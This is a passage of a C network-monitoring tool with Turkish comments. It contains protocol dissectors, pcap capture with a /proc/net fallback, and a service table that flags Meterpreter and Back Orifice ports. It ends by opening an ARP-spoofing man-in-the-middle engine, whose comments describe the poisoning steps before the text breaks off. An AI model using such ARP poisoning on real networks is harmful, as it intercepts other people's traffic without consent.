}

/* ---------- SYSLOG ---------- */
static void dissect_syslog(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    char line[256];
    int copy_len = (len < 255) ? len : 255;
    memcpy(line, data, copy_len);
    line[copy_len] = '\0';
    char *cr = strpbrk(line, "\r\n");
    if (cr) *cr = '\0';

    strncpy(pkt->protocol, "SYSLOG", sizeof(pkt->protocol) - 1);
    snprintf(pkt->info, sizeof(pkt->info), "%s", line);
    add_layer(pkt, LAYER_SYSLOG, "Syslog", pkt->info, base_off, len, "%s", line);
}

/* ---------- TFTP ---------- */
static void dissect_tftp(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 2) return;
    int op = (data[0] << 8) | data[1];
    const char *op_str = (op == 1) ? "Read Request" : (op == 2) ? "Write Request" :
                         (op == 3) ? "Data" : (op == 4) ? "Ack" : "Unknown";
    strncpy(pkt->protocol, "TFTP", sizeof(pkt->protocol) - 1);
    snprintf(pkt->info, sizeof(pkt->info), "%s", op_str);
    add_layer(pkt, LAYER_TFTP, "Trivial File Transfer Protocol", pkt->info, base_off, len,
              "Opcode: %d (%s)", op, op_str);
}

/* ---------- MySQL ---------- */
static void dissect_mysql(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 4) return;
    int pkt_len = data[0] | (data[1] << 8) | (data[2] << 16);
    int seq = data[3];
    int cmd = (len > 4) ? data[4] : -1;

    const char *cmd_str = "";
    switch (cmd) {
        case 0: cmd_str = "Sleep"; break;
        case 1: cmd_str = "Quit"; break;
        case 2: cmd_str = "Init DB"; break;
        case 3: cmd_str = "Query"; break;
        case 14: cmd_str = "Ping"; break;
        case 22: cmd_str = "Prepare"; break;
        default: cmd_str = "Other"; break;
    }

    strncpy(pkt->protocol, "MySQL", sizeof(pkt->protocol) - 1);
    if (cmd == 3 && len > 5) {
        char q[256];
        int qlen = (len - 5 < 255) ? len - 5 : 255;
        memcpy(q, data + 5, qlen);
        q[qlen] = '\0';
        snprintf(pkt->info, sizeof(pkt->info), "Query: %s", q);
    } else {
        snprintf(pkt->info, sizeof(pkt->info), "Seq=%d %s", seq, cmd_str);
    }
    add_layer(pkt, LAYER_MYSQL, "MySQL Protocol", pkt->info, base_off, len,
              "Packet Length: %d\nSequence: %d\nCommand: %d (%s)", pkt_len, seq, cmd, cmd_str);
}

/* ---------- PostgreSQL ---------- */
static void dissect_postgres(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 5) return;
    char tag = data[0];
    int pkt_len = (data[1] << 24) | (data[2] << 16) | (data[3] << 8) | data[4];

    const char *tag_str = "";
    switch (tag) {
        case 'Q': tag_str = "Query"; break;
        case 'P': tag_str = "Parse"; break;
        case 'B': tag_str = "Bind"; break;
        case 'E': tag_str = "Execute"; break;
        case 'C': tag_str = "Close"; break;
        case 'R': tag_str = "ReadyForQuery"; break;
        default: tag_str = "Other"; break;
    }

    strncpy(pkt->protocol, "PostgreSQL", sizeof(pkt->protocol) - 1);
    if (tag == 'Q' && len > 5) {
        char q[256];
        int qlen = (len - 5 < 255) ? len - 5 : 255;
        memcpy(q, data + 5, qlen);
        q[qlen] = '\0';
        snprintf(pkt->info, sizeof(pkt->info), "Query: %s", q);
    } else {
        snprintf(pkt->info, sizeof(pkt->info), "%s Len=%d", tag_str, pkt_len);
    }
    add_layer(pkt, LAYER_POSTGRES, "PostgreSQL Protocol", pkt->info, base_off, len,
              "Tag: %c (%s)\nLength: %d", tag, tag_str, pkt_len);
}

/* ---------- Redis ---------- */
static void dissect_redis(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    char line[256];
    int copy_len = (len < 255) ? len : 255;
    memcpy(line, data, copy_len);
    line[copy_len] = '\0';
    char *cr = strpbrk(line, "\r\n");
    if (cr) *cr = '\0';

    strncpy(pkt->protocol, "Redis", sizeof(pkt->protocol) - 1);
    strncpy(pkt->info, line, sizeof(pkt->info) - 1);
    add_layer(pkt, LAYER_REDIS, "Redis Protocol", pkt->info, base_off, len, "%s", line);
}

/* ---------- MongoDB ---------- */
static void dissect_mongodb(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 16) return;
    int msg_len = (data[0] | (data[1] << 8) | (data[2] << 16) | (data[3] << 24));
    int req_id = (data[4] | (data[5] << 8));
    int op = (data[12] | (data[13] << 8) | (data[14] << 16) | (data[15] << 24));

    const char *op_str = "";
    switch (op) {
        case 2004: op_str = "OP_QUERY"; break;
        case 2010: op_str = "OP_INSERT"; break;
        case 2001: op_str = "OP_UPDATE"; break;
        case 2007: op_str = "OP_DELETE"; break;
        case 2005: op_str = "OP_GET_MORE"; break;
        default: op_str = "Unknown"; break;
    }

    strncpy(pkt->protocol, "MongoDB", sizeof(pkt->protocol) - 1);
    snprintf(pkt->info, sizeof(pkt->info), "%s ID=%d", op_str, req_id);
    add_layer(pkt, LAYER_MONGODB, "MongoDB Wire Protocol", pkt->info, base_off, len,
              "Message Length: %d\nRequest ID: %d\nOpcode: %d (%s)", msg_len, req_id, op, op_str);
}

/* ---------- SSH ---------- */
static void dissect_ssh(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    char line[256];
    int copy_len = (len < 255) ? len : 255;
    memcpy(line, data, copy_len);
    line[copy_len] = '\0';
    char *cr = strpbrk(line, "\r\n");
    if (cr) *cr = '\0';

    strncpy(pkt->protocol, "SSH", sizeof(pkt->protocol) - 1);
    if (strstr(line, "SSH-")) {
        snprintf(pkt->info, sizeof(pkt->info), "%s", line);
    } else {
        snprintf(pkt->info, sizeof(pkt->info), "Encrypted packet (%d bytes)", len);
    }
    add_layer(pkt, LAYER_SSH, "Secure Shell", pkt->info, base_off, len, "%s", line);
}

/* ---------- FTP ---------- */
static void dissect_ftp(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    char line[256];
    int copy_len = (len < 255) ? len : 255;
    memcpy(line, data, copy_len);
    line[copy_len] = '\0';
    char *cr = strpbrk(line, "\r\n");
    if (cr) *cr = '\0';

    strncpy(pkt->protocol, "FTP", sizeof(pkt->protocol) - 1);
    strncpy(pkt->info, line, sizeof(pkt->info) - 1);
    add_layer(pkt, LAYER_FTP, "File Transfer Protocol", pkt->info, base_off, len, "%s", line);
}

/* ---------- SMTP ---------- */
static void dissect_smtp(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    char line[256];
    int copy_len = (len < 255) ? len : 255;
    memcpy(line, data, copy_len);
    line[copy_len] = '\0';
    char *cr = strpbrk(line, "\r\n");
    if (cr) *cr = '\0';

    strncpy(pkt->protocol, "SMTP", sizeof(pkt->protocol) - 1);
    strncpy(pkt->info, line, sizeof(pkt->info) - 1);
    add_layer(pkt, LAYER_SMTP, "Simple Mail Transfer Protocol", pkt->info, base_off, len, "%s", line);
}

/* ---------- POP3 ---------- */
static void dissect_pop3(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    char line[256];
    int copy_len = (len < 255) ? len : 255;
    memcpy(line, data, copy_len);
    line[copy_len] = '\0';
    char *cr = strpbrk(line, "\r\n");
    if (cr) *cr = '\0';

    strncpy(pkt->protocol, "POP3", sizeof(pkt->protocol) - 1);
    strncpy(pkt->info, line, sizeof(pkt->info) - 1);
    add_layer(pkt, LAYER_POP3, "Post Office Protocol v3", pkt->info, base_off, len, "%s", line);
}

/* ---------- IMAP ---------- */
static void dissect_imap(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    char line[256];
    int copy_len = (len < 255) ? len : 255;
    memcpy(line, data, copy_len);
    line[copy_len] = '\0';
    char *cr = strpbrk(line, "\r\n");
    if (cr) *cr = '\0';

    strncpy(pkt->protocol, "IMAP", sizeof(pkt->protocol) - 1);
    strncpy(pkt->info, line, sizeof(pkt->info) - 1);
    add_layer(pkt, LAYER_IMAP, "Internet Message Access Protocol", pkt->info, base_off, len, "%s", line);
}

/* ---------- RDP ---------- */
static void dissect_rdp(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    strncpy(pkt->protocol, "RDP", sizeof(pkt->protocol) - 1);
    snprintf(pkt->info, sizeof(pkt->info), "RDP data (%d bytes)", len);
    add_layer(pkt, LAYER_RDP, "Remote Desktop Protocol", pkt->info, base_off, len,
              "Length: %d bytes", len);
}

/* ---------- VNC ---------- */
static void dissect_vnc(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    strncpy(pkt->protocol, "VNC", sizeof(pkt->protocol) - 1);
    snprintf(pkt->info, sizeof(pkt->info), "VNC data (%d bytes)", len);
    add_layer(pkt, LAYER_VNC, "Virtual Network Computing", pkt->info, base_off, len,
              "Length: %d bytes", len);
}

/* ---------- STUN ---------- */
static void dissect_stun(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 20) return;
    int type = (data[0] << 8) | data[1];
    int magic = (data[4] << 24) | (data[5] << 16) | (data[6] << 8) | data[7];

    if (magic != 0x2112A442) return; // STUN magic cookie

    const char *tstr = "";
    switch (type) {
        case 0x0001: tstr = "Binding Request"; break;
        case 0x0101: tstr = "Binding Response"; break;
        case 0x0111: tstr = "Binding Error"; break;
        default: tstr = "Other"; break;
    }

    strncpy(pkt->protocol, "STUN", sizeof(pkt->protocol) - 1);
    snprintf(pkt->info, sizeof(pkt->info), "%s", tstr);
    add_layer(pkt, LAYER_STUN, "Session Traversal Utilities for NAT", pkt->info, base_off, len,
              "Type: 0x%04x (%s)\nMagic Cookie: 0x%08x", type, tstr, magic);
}

/* ---------- Raw Text / Unknown ---------- */
static void dissect_raw_text(PacketRecord *pkt, const u_char *data, int len, int base_off, int sport, int dport) {
    /* Sadece yazdırılabilir karakter içeriyorsa text olarak göster */
    int printable = 0;
    for (int i = 0; i < len && i < 64; i++) {
        if (data[i] >= 32 && data[i] <= 126) printable++;
    }
    if (printable < len / 2) return;  // binary gibi duruyor, atla

    char line[128];
    int copy_len = (len < 127) ? len : 127;
    memcpy(line, data, copy_len);
    line[copy_len] = '\0';
    /* Non-printable'ları nokta yap */
    for (int i = 0; line[i]; i++) {
        if (line[i] < 32 || line[i] > 126) line[i] = '.';
    }

    strncpy(pkt->protocol, "DATA", sizeof(pkt->protocol) - 1);
    snprintf(pkt->info, sizeof(pkt->info), "Raw data: \"%s\"", line);
    add_layer(pkt, LAYER_DATA, "Data", pkt->info, base_off, len,
              "Port %d → %d\nData (%d bytes): %s", sport, dport, len, line);
}

/* ==================================================================
 *   YARDIMCI FONKSİYONLAR
 * ================================================================== */

const char *svc_name(int port) {
    switch (port) {
        case 20: return "FTP-DATA"; case 21: return "FTP"; case 22: return "SSH";
        case 23: return "Telnet"; case 25: return "SMTP"; case 53: return "DNS";
        case 67: return "DHCP-Server"; case 68: return "DHCP-Client";
        case 69: return "TFTP"; case 80: return "HTTP"; case 110: return "POP3";
        case 123: return "NTP"; case 137: return "NetBIOS-NS"; case 138: return "NetBIOS-DGM";
        case 143: return "IMAP"; case 161: return "SNMP"; case 162: return "SNMP-Trap";
        case 389: return "LDAP"; case 443: return "HTTPS"; case 445: return "SMB";
        case 514: return "Syslog"; case 587: return "SMTP-Submit"; case 636: return "LDAPS";
        case 993: return "IMAPS"; case 995: return "POP3S"; case 1433: return "MSSQL";
        case 1521: return "Oracle"; case 1900: return "SSDP"; case 2049: return "NFS";
        case 3306: return "MySQL"; case 3389: return "RDP"; case 3478: return "STUN";
        case 3479: return "STUN-TURN"; case 3689: return "DAAP"; case 5000: return "Flask";
        case 5353: return "mDNS"; case 5355: return "LLMNR"; case 5432: return "PostgreSQL";
        case 5900: case 5901: return "VNC"; case 6379: return "Redis";
        case 8000: return "HTTP-Alt"; case 8080: return "HTTP-Proxy"; case 8443: return "HTTPS-Alt";
        case 9090: return "Prometheus"; case 27017: return "MongoDB";
        case 4444: return "Meterpreter"; case 5555: return "ADB"; case 31337: return "BackOrifice";
        default: return "?";
    }
}

const char *ip_proto_name(int proto) {
    switch (proto) {
        case 1: return "ICMP"; case 2: return "IGMP"; case 6: return "TCP";
        case 17: return "UDP"; case 41: return "IPv6"; case 47: return "GRE";
        case 50: return "ESP"; case 51: return "AH"; case 89: return "OSPF";
        case 132: return "SCTP"; default: return "Unknown";
    }
}

/* DNS name parser (basit, pointer takip eder) */
static int parse_dns_name(char *out, int out_len, const u_char *data, int off, int max_off) {
    int pos = 0;
    int first = 1;
    while (off < max_off && pos < out_len - 1) {
        int len = data[off++];
        if (len == 0) break;
        if (len & 0xC0) {
            /* Pointer — compressed name, skip */
            off++;
            break;
        }
        if (!first) out[pos++] = '.';
        first = 0;
        if (off + len > max_off) break;
        for (int i = 0; i < len && pos < out_len - 1; i++) {
            char c = data[off + i];
            out[pos++] = (c >= 32 && c <= 126) ? c : '.';
        }
        off += len;
    }
    out[pos] = '\0';
    return off;
}

/* ==================================================================
 *   CORE API
 * ================================================================== */

void full_monitor_init(void) {
    if (initialized) return;
    platform_mutex_init(&global_lock);
    memset(packet_buffer, 0, sizeof(packet_buffer));
    memset(&stats, 0, sizeof(stats));
    write_idx = 0;
    packet_count = 0;
    total_captured = 0;
    initialized = 1;
}

void full_monitor_cleanup(void) {
    if (!initialized) return;
    running = 0;
    platform_sleep_ms(200);
    platform_mutex_destroy(&global_lock);
    initialized = 0;
}

/* Ana packet handler — her paket için 1 kere çağrılır */
static void handle_packet(const struct pcap_pkthdr *header, const u_char *packet) {
    PacketRecord pkt;
    memset(&pkt, 0, sizeof(PacketRecord));

    /* Timestamp */
    pkt.timestamp = (double)header->ts.tv_sec + (header->ts.tv_usec / 1000000.0);
    pkt.length = header->len;
    pkt.packet_number = total_captured + 1;  /* yaklaşık, lock öncesi */

    /* Raw data copy */
    int raw_len = ((int)header->caplen < MAX_RAW_SIZE) ? (int)header->caplen : MAX_RAW_SIZE;
    memcpy(pkt.raw_data, packet, raw_len);
    pkt.raw_len = raw_len;

    /* Başla: datalink tipine göre dissect */
#ifdef PLATFORM_LINUX
    if (g_datalink_type == DLT_LINUX_SLL) {
        dissect_linux_sll(&pkt, packet, header->caplen);
    } else {
        dissect_ethernet(&pkt, packet, header->caplen);
    }
#else
    dissect_ethernet(&pkt, packet, header->caplen);
#endif

    /* Eğer protokol hâlâ boşsa varsayılan ata */
    if (pkt.protocol[0] == '\0') {
        strncpy(pkt.protocol, "ETH", sizeof(pkt.protocol) - 1);
        strncpy(pkt.info, "Ethernet frame", sizeof(pkt.info) - 1);
    }

    /* Buffer'a ekle (thread-safe) */
    platform_mutex_lock(&global_lock);
    packet_buffer[write_idx] = pkt;
    write_idx = (write_idx + 1) % PACKET_BUFFER_SIZE;
    total_captured++;
    if (packet_count < PACKET_BUFFER_SIZE) packet_count++;
    stats.total = total_captured;
    platform_mutex_unlock(&global_lock);
}

#ifdef PLATFORM_LINUX
static void pcap_cb(u_char *user, const struct pcap_pkthdr *h, const u_char *pkt) {
    (void)user;
    handle_packet(h, pkt);
}
#endif

/* Try to open an interface, only accept Ethernet (DLT_EN10MB) datalink */
static pcap_t *try_open_ethernet(const char *name, char *errbuf) {
    pcap_t *h = pcap_open_live(name, 65535, 1, 100, errbuf);
    if (!h) return NULL;
    int dlt = pcap_datalink(h);
    if (dlt != DLT_EN10MB) {
        /* Not Ethernet — close and skip */
        fprintf(stderr, "[FULL_MONITOR] Skipping %s (datalink=%d, need Ethernet)\n", name, dlt);
        pcap_close(h);
        return NULL;
    }
    fprintf(stderr, "[FULL_MONITOR] Opened %s (Ethernet)\n", name);
    return h;
}

/* ==========================================================================
 *   /proc/net FALLBACK — When pcap can't open real interfaces (no CAP_NET_RAW)
 *   Polls /proc/net/tcp, /proc/net/udp, /proc/net/tcp6, /proc/net/udp6
 *   to build PacketRecords from active connections.
 * ========================================================================== */

static void hex_to_ip(const char *hex, char *ip, int ip_len) {
    unsigned int addr;
    sscanf(hex, "%x", &addr);
    unsigned char *b = (unsigned char *)&addr;
    snprintf(ip, ip_len, "%d.%d.%d.%d", b[0], b[1], b[2], b[3]);
}

/* TCP state names */
static const char *tcp_state_name(int state) {
    switch (state) {
        case 1:  return "ESTABLISHED";
        case 2:  return "SYN_SENT";
        case 3:  return "SYN_RECV";
        case 4:  return "FIN_WAIT1";
        case 5:  return "FIN_WAIT2";
        case 6:  return "TIME_WAIT";
        case 7:  return "CLOSE";
        case 8:  return "CLOSE_WAIT";
        case 9:  return "LAST_ACK";
        case 10: return "LISTEN";
        case 11: return "CLOSING";
        default: return "UNKNOWN";
    }
}

/* Parse one line from /proc/net/tcp or /proc/net/udp and create a PacketRecord */
static int parse_proc_net_line(const char *line, const char *proto, PacketRecord *pkt) {
    unsigned int sl;
    char local_hex_addr[16], remote_hex_addr[16];
    unsigned int local_port, remote_port;
    unsigned int state;
    unsigned int tx_queue, rx_queue;
    unsigned int timer, tm_when;
    unsigned int uid;

    int parsed = sscanf(line, " %u: %8[0-9A-Fa-f]:%X %8[0-9A-Fa-f]:%X %X %X:%X %X:%X %*X %u",
                        &sl, local_hex_addr, &local_port,
                        remote_hex_addr, &remote_port,
                        &state, &tx_queue, &rx_queue,
                        &timer, &tm_when, &uid);
    if (parsed < 11) return 0;

    /* Skip entries with no remote address (0.0.0.0:0 for LISTEN) for UDP,
       but keep LISTEN state for TCP */
    unsigned int remote_addr_val;
    sscanf(remote_hex_addr, "%x", &remote_addr_val);
    int is_tcp = (strcmp(proto, "TCP") == 0);

    /* Skip pure listeners for UDP (they're not interesting as "traffic") */
    if (!is_tcp && remote_addr_val == 0 && remote_port == 0) return 0;

    memset(pkt, 0, sizeof(PacketRecord));
    pkt->timestamp = (double)time(NULL);
    
    hex_to_ip(local_hex_addr, pkt->src_ip, sizeof(pkt->src_ip));
    hex_to_ip(remote_hex_addr, pkt->dst_ip, sizeof(pkt->dst_ip));
    snprintf(pkt->src_port, sizeof(pkt->src_port), "%d", local_port);
    snprintf(pkt->dst_port, sizeof(pkt->dst_port), "%d", remote_port);
    strncpy(pkt->protocol, proto, sizeof(pkt->protocol) - 1);

    if (is_tcp) {
        const char *sname = tcp_state_name(state);
        snprintf(pkt->info, sizeof(pkt->info), "%d → %d [%s] tx=%u rx=%u",
                 local_port, remote_port, sname, tx_queue, rx_queue);
        strncpy(pkt->flags, sname, sizeof(pkt->flags) - 1);

        /* Upgrade protocol for well-known ports */
        if (local_port == 443 || remote_port == 443 ||
            local_port == 8443 || remote_port == 8443)
            strncpy(pkt->protocol, "TLS", sizeof(pkt->protocol) - 1);
        else if (local_port == 80 || remote_port == 80 ||
                 local_port == 8080 || remote_port == 8080)
            strncpy(pkt->protocol, "HTTP", sizeof(pkt->protocol) - 1);
        else if (local_port == 22 || remote_port == 22)
            strncpy(pkt->protocol, "SSH", sizeof(pkt->protocol) - 1);
        else if (local_port == 53 || remote_port == 53)
            strncpy(pkt->protocol, "DNS", sizeof(pkt->protocol) - 1);
        else if (local_port == 21 || remote_port == 21)
            strncpy(pkt->protocol, "FTP", sizeof(pkt->protocol) - 1);
        else if (local_port == 25 || remote_port == 25 ||
                 local_port == 587 || remote_port == 587)
            strncpy(pkt->protocol, "SMTP", sizeof(pkt->protocol) - 1);
        else if (local_port == 3306 || remote_port == 3306)
            strncpy(pkt->protocol, "MySQL", sizeof(pkt->protocol) - 1);
        else if (local_port == 5432 || remote_port == 5432)
            strncpy(pkt->protocol, "PostgreSQL", sizeof(pkt->protocol) - 1);
        else if (local_port == 6379 || remote_port == 6379)
            strncpy(pkt->protocol, "Redis", sizeof(pkt->protocol) - 1);
        else if (local_port == 3389 || remote_port == 3389)
            strncpy(pkt->protocol, "RDP", sizeof(pkt->protocol) - 1);
    } else {
        snprintf(pkt->info, sizeof(pkt->info), "%d → %d Len=?",
                 local_port, remote_port);

        if (local_port == 53 || remote_port == 53)
            strncpy(pkt->protocol, "DNS", sizeof(pkt->protocol) - 1);
        else if (local_port == 67 || remote_port == 67 ||
                 local_port == 68 || remote_port == 68)
            strncpy(pkt->protocol, "DHCP", sizeof(pkt->protocol) - 1);
        else if (local_port == 5353 || remote_port == 5353)
            strncpy(pkt->protocol, "mDNS", sizeof(pkt->protocol) - 1);
        else if (local_port == 123 || remote_port == 123)
            strncpy(pkt->protocol, "NTP", sizeof(pkt->protocol) - 1);
        else if (local_port == 161 || remote_port == 161)
            strncpy(pkt->protocol, "SNMP", sizeof(pkt->protocol) - 1);
        else if (local_port == 443 || remote_port == 443)
            strncpy(pkt->protocol, "QUIC", sizeof(pkt->protocol) - 1);
    }

    /* Add a layer for display */
    add_layer(pkt, is_tcp ? LAYER_TCP : LAYER_UDP,
              is_tcp ? "TCP Connection" : "UDP Connection",
              pkt->info, 0, 0,
              "Source: %s:%d\nDestination: %s:%d\nProtocol: %s\n%s",
              pkt->src_ip, local_port, pkt->dst_ip, remote_port,
              pkt->protocol, is_tcp ? pkt->flags : "");

    return 1;
}

/* Parse /proc/net/tcp or /proc/net/udp and add entries to buffer */
static int poll_proc_net_file(const char *path, const char *proto) {
    FILE *fp = fopen(path, "r");
    if (!fp) return 0;

    char line[512];
    fgets(line, sizeof(line), fp); /* skip header */

    int added = 0;
    while (fgets(line, sizeof(line), fp)) {
        PacketRecord pkt;
        if (parse_proc_net_line(line, proto, &pkt)) {
            pkt.packet_number = total_captured + 1;

            platform_mutex_lock(&global_lock);
            packet_buffer[write_idx] = pkt;
            write_idx = (write_idx + 1) % PACKET_BUFFER_SIZE;
            total_captured++;
            if (packet_count < PACKET_BUFFER_SIZE) packet_count++;
            stats.total = total_captured;
            if (strcmp(pkt.protocol, "TCP") == 0 ||
                strcmp(pkt.protocol, "TLS") == 0 ||
                strcmp(pkt.protocol, "HTTP") == 0 ||
                strcmp(pkt.protocol, "SSH") == 0 ||
                strcmp(pkt.protocol, "FTP") == 0 ||
                strcmp(pkt.protocol, "SMTP") == 0)
                __sync_fetch_and_add(&stats.tcp, 1);
            else if (strcmp(pkt.protocol, "UDP") == 0 ||
                     strcmp(pkt.protocol, "QUIC") == 0)
                __sync_fetch_and_add(&stats.udp, 1);
            else if (strcmp(pkt.protocol, "DNS") == 0)
                __sync_fetch_and_add(&stats.dns, 1);
            else if (strcmp(pkt.protocol, "DHCP") == 0)
                __sync_fetch_and_add(&stats.dhcp, 1);
            else if (strcmp(pkt.protocol, "mDNS") == 0)
                __sync_fetch_and_add(&stats.mdns, 1);
            platform_mutex_unlock(&global_lock);
            added++;
        }
    }
    fclose(fp);
    return added;
}

/* Fallback thread: polls /proc/net every 2 seconds */
static void *procnet_fallback_thread(void *arg) {
    (void)arg;
    fprintf(stderr, "[FULL_MONITOR] Fallback mode: polling /proc/net (no CAP_NET_RAW for pcap)\n");
    fprintf(stderr, "[FULL_MONITOR] Ipucu: Tum trafigi gormek icin sudo ile calistirin veya:\n");
    fprintf(stderr, "[FULL_MONITOR]   sudo setcap cap_net_raw,cap_net_admin+eip ./build/guvenlik_merkezi\n");

    platform_sleep_ms(1000); /* ilk başta biraz bekle */

    while (running) {
        /* Clear old entries on each poll to avoid duplicates growing endlessly */
        platform_mutex_lock(&global_lock);
        write_idx = 0;
        packet_count = 0;
        /* Don't reset total_captured — keep cumulative stats */
        platform_mutex_unlock(&global_lock);

        poll_proc_net_file("/proc/net/tcp", "TCP");
        poll_proc_net_file("/proc/net/udp", "UDP");

        platform_sleep_ms(2000); /* Poll every 2 seconds */
    }
    return NULL;
}

static void *monitor_thread(void *arg) {
    char *iface = (char *)arg;
#ifdef PLATFORM_LINUX
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = NULL;

    if (!iface || !iface[0]) {
        pcap_if_t *devs;
        if (pcap_findalldevs(&devs, errbuf) >= 0 && devs) {
            /*
             * Phase 1: Prefer known real network interfaces.
             * Order: wlan*, eth*, enp*, ens*, eno*, then "any".
             */
            const char *preferred_prefixes[] = {"wlan", "eth", "enp", "ens", "eno", NULL};
            for (int p = 0; preferred_prefixes[p] && !handle; p++) {
                for (pcap_if_t *d = devs; d; d = d->next) {
                    if (strncmp(d->name, preferred_prefixes[p], strlen(preferred_prefixes[p])) == 0) {
                        handle = try_open_ethernet(d->name, errbuf);
                        if (handle) break;
                    }
                }
            }

            /* Phase 2: Try the "any" pseudo-device (captures all interfaces) */
            if (!handle) {
                for (pcap_if_t *d = devs; d; d = d->next) {
                    if (strcmp(d->name, "any") == 0) {
                        /* "any" uses DLT_LINUX_SLL (113) — need special handling */
                        handle = pcap_open_live(d->name, 65535, 1, 100, errbuf);
                        if (handle) {
                            int dlt = pcap_datalink(handle);
                            /* Only accept Ethernet or Linux SLL */
                            if (dlt != DLT_EN10MB && dlt != DLT_LINUX_SLL) {
                                pcap_close(handle);
                                handle = NULL;
                            } else {
                                fprintf(stderr, "[FULL_MONITOR] Opened 'any' (dlt=%d)\n", dlt);
                            }
                        }
                        break;
                    }
                }
            }

            /* Phase 3: Try every interface and pick the first Ethernet one */
            if (!handle) {
                for (pcap_if_t *d = devs; d; d = d->next) {
                    /* Skip known non-network devices */
                    if (strncmp(d->name, "bluetooth", 9) == 0 ||
                        strncmp(d->name, "dbus", 4) == 0 ||
                        strncmp(d->name, "nflog", 5) == 0 ||
                        strncmp(d->name, "nfqueue", 7) == 0 ||
                        strcmp(d->name, "lo") == 0 ||
                        strcmp(d->name, "any") == 0) continue;
                    handle = try_open_ethernet(d->name, errbuf);
                    if (handle) break;
                }
            }

            pcap_freealldevs(devs);
        }
    } else {
        handle = try_open_ethernet(iface, errbuf);
        /* If explicit iface requested, also try without DLT check as fallback */
        if (!handle) {
            handle = pcap_open_live(iface, 65535, 1, 100, errbuf);
        }
    }

    if (handle) {
        int dlt = pcap_datalink(handle);
        g_datalink_type = dlt;
        pcap_handle = handle;
        pcap_setnonblock(handle, 1, errbuf);

        fprintf(stderr, "[FULL_MONITOR] Capture started (datalink=%d)\n", dlt);

        while (running) {
            int ret = pcap_dispatch(handle, 100, pcap_cb, NULL);
            if (ret == 0) platform_sleep_ms(5);
            else if (ret < 0 && ret != PCAP_ERROR_BREAK) platform_sleep_ms(50);
        }
        pcap_close(handle);
        pcap_handle = NULL;
    } else {
        /* ===== FALLBACK: pcap failed, use /proc/net polling ===== */
        fprintf(stderr, "[FULL_MONITOR] pcap failed: %s\n", errbuf);
        procnet_fallback_thread(NULL);
    }
#endif
    free(iface);
    return NULL;
}

void full_monitor_start(const char *iface) {
    if (running) return;
    running = 1;
    char *copy = iface ? strdup(iface) : NULL;
    platform_thread_t t;
    platform_thread_create(&t, monitor_thread, copy);
    platform_thread_detach(t);
}

void full_monitor_stop(void) {
    running = 0;
#ifdef PLATFORM_LINUX
    if (pcap_handle) pcap_breakloop(pcap_handle);
#endif
    platform_sleep_ms(150);  /* thread'in kapanması için kısa bekle */
}

void full_monitor_clear(void) {
    if (!initialized) return;
    platform_mutex_lock(&global_lock);
    memset(packet_buffer, 0, sizeof(packet_buffer));
    write_idx = 0;
    packet_count = 0;
    total_captured = 0;
    memset(&stats, 0, sizeof(stats));
    platform_mutex_unlock(&global_lock);
}

int full_monitor_get_packets(PacketRecord *out, int max_count, int offset) {
    if (!out || max_count <= 0) return 0;
    platform_mutex_lock(&global_lock);
    int avail = packet_count;  /* buffer'da mevcut paket sayısı (max PACKET_BUFFER_SIZE) */
    int count = (avail < max_count) ? avail : max_count;
    /* En eski paketten başla: write_idx - packet_count konumu */
    int start = (write_idx - avail + PACKET_BUFFER_SIZE) % PACKET_BUFFER_SIZE;
    for (int i = 0; i < count; i++) {
        out[i] = packet_buffer[(start + i) % PACKET_BUFFER_SIZE];
    }
    platform_mutex_unlock(&global_lock);
    return count;
}

int full_monitor_get_filtered(PacketRecord *out, int max_count, const char *filter_proto) {
    if (!out || max_count <= 0 || !filter_proto) return 0;
    platform_mutex_lock(&global_lock);
    int avail = packet_count;
    int start = (write_idx - avail + PACKET_BUFFER_SIZE) % PACKET_BUFFER_SIZE;
    int found = 0;
    for (int i = 0; i < avail && found < max_count; i++) {
        PacketRecord *p = &packet_buffer[(start + i) % PACKET_BUFFER_SIZE];
        if (strcasecmp(p->protocol, filter_proto) == 0 ||
            strstr(p->protocol, filter_proto)) {
            out[found++] = *p;
        }
    }
    platform_mutex_unlock(&global_lock);
    return found;
}

void full_monitor_get_stats(FullStats *s) {
    if (!s) return;
    platform_mutex_lock(&global_lock);
    *s = stats;
    platform_mutex_unlock(&global_lock);
}

/* ==================================================================
 *   ARP SPOOF ENGINE — Ağdaki diğer cihazların trafiğini yakalamak için
 *   MITM (Man-in-the-Middle) ARP zehirleme motoru.
 *
 *   Çalışma prensibi:
 *   1. Hedef cihaza "gateway'in MAC'i benim MAC'im" der
 *   2. Gateway'e "hedef cihazın MAC'i benim MAC'im" der
 *   3. IP forwarding açılır, trafik bizden geçer
 *   4. pcap zaten promiscuous modda çalıştığı için bu trafiği yakalar
 * ================================================================== */

#ifdef PLATFORM_LINUX

/* ARP spoof state */
static int g_arp_spoof_running = 0;
static platform_thread_t g_arp_thread;
static unsigned char g_gateway_mac[6];
static unsigned char g_target_mac[6];
static unsigned char g_my_mac[6];
static char g_spoof_target_ip[MAX_IP_LEN] = {0};
static char g_spoof_gateway_ip[MAX_IP_LEN] = {0};
static char g_spoof_iface[MAX_IFACE_LEN] = {0};
static volatile int g_arp_raw_fd = -1;
static int g_ip_forward_original = -1;

/* --- Yardımcı: Kendi MAC adresimizi al --- */
static int spoof_get_own_mac(const char *iface, unsigned char *mac) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) { close(fd); return -1; }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
    return 0;
}

/* --- Yardımcı: Kendi IP adresimizi al --- */
static int spoof_get_own_ip(const char *iface, char *ip_out, int ip_len) {
